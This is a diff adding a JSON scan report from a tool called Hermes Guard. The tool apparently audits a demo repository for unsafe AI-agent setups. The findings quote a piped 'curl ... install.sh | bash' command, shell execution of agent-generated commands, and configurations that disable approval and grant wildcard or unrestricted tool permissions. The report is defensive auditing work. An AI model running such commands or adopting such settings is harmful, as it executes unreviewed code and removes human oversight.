@@ -1,0 +1,111 @@
+{
+  "tool": "Hermes Guard",
+  "generatedAt": "2026-05-16T21:45:00.000Z",
+  "target": "C:/NEXA/hermes-guard/demo-repo",
+  "summary": {
+    "riskPosture": "Critical",
+    "riskScore": 100,
+    "filesScanned": 6,
+    "findingCount": 19,
+    "severityCounts": {
+      "Critical": 3,
+      "High": 13,
+      "Medium": 3,
+      "Low": 0
+    }
+  },
+  "hermes": {
+    "status": {
+      "available": false,
+      "mode": "stub",
+      "message": "Hermes Agent runtime is not connected. Hermes Guard is running deterministic local rules only."
+    }
+  },
+  "files": [
+    "AGENTS.md",
+    ".env.example",
+    ".github/workflows/agent.yml",
+    "prompts/system-prompt.md",
+    "scripts/dangerous-agent-runner.js",
+    "README.md"
+  ],
+  "activity": [
+    {
+      "time": "00:00",
+      "label": "Repository opened",
+      "detail": "Scanner selected demo-repo as the local target."
+    },
+    {
+      "time": "00:01",
+      "label": "Rules loaded",
+      "detail": "8 deterministic risk rules prepared."
+    },
+    {
+      "time": "00:02",
+      "label": "Hermes adapter checked",
+      "detail": "Runtime unavailable; using stub mode without runtime claims."
+    },
+    {
+      "time": "00:03",
+      "label": "Evidence captured",
+      "detail": "Findings mapped to file paths, line numbers, and snippets."
+    },
+    {
+      "time": "00:04",
+      "label": "Reports ready",
+      "detail": "Markdown and JSON reports written locally."
+    }
+  ],
+  "findings": [
+    {
+      "id": "HG-003-1",
+      "title": "Unrestricted shell execution",
+      "severity": "Critical",
+      "filePath": "scripts/dangerous-agent-runner.js",
+      "lineNumber": 14,
+      "evidence": "childProcess.exec(agentGeneratedCommand);",
+      "whyItMatters": "Letting model or tool output reach a shell can turn a suggestion into local code execution.",
+      "recommendedFix": "Use structured commands, strict allowlists, argument arrays, and human approval before running mutating commands."
+    },
+    {
+      "id": "HG-006-1",
+      "title": "Remote script piped into shell",
+      "severity": "Critical",
+      "filePath": "scripts/dangerous-agent-runner.js",
+      "lineNumber": 19,
+      "evidence": "childProcess.exec(\"curl https://example.invalid/install.sh | bash\");",
+      "whyItMatters": "Piping remote content directly into a shell bypasses review and can execute changed code without a local audit trail.",
+      "recommendedFix": "Download to a reviewed file, verify integrity, pin sources, and require human approval before execution."
+    },
+    {
+      "id": "HG-004-1",
+      "title": "Agent approval disabled",
+      "severity": "High",
+      "filePath": "AGENTS.md",
+      "lineNumber": 5,
+      "evidence": "approval_mode: none",
+      "whyItMatters": "Disabling approvals removes the human checkpoint that should protect repository writes, tool calls, and deployments.",
+      "recommendedFix": "Require approval for file writes, shell commands, package installs, network calls, pushes, merges, and deployments."
+    },
+    {
+      "id": "HG-005-1",
+      "title": "Wildcard tool or file permission",
+      "severity": "High",
+      "filePath": "AGENTS.md",
+      "lineNumber": 6,
+      "evidence": "allow: \"*\"",
+      "whyItMatters": "Wildcard allow rules make it hard to reason about what an agent can read, write, or execute.",
+      "recommendedFix": "Replace wildcard permissions with named tools, scoped paths, and a deny list for secrets, build output, and repository metadata."
+    },
+    {
+      "id": "HG-008-1",
+      "title": "Overly broad MCP or tool permission config",
+      "severity": "Medium",
+      "filePath": "AGENTS.md",
+      "lineNumber": 8,
+      "evidence": "MCP tool permissions: unrestricted filesystem, unrestricted shell, unrestricted browser.",
+      "whyItMatters": "Broad MCP permissions can expose filesystem, network, browser, or credential capabilities beyond what a repo task needs.",
+      "recommendedFix": "Declare the minimal MCP servers and tool calls needed, disable unused tools, and require approvals for sensitive capabilities."
+    }
+  ]
+}
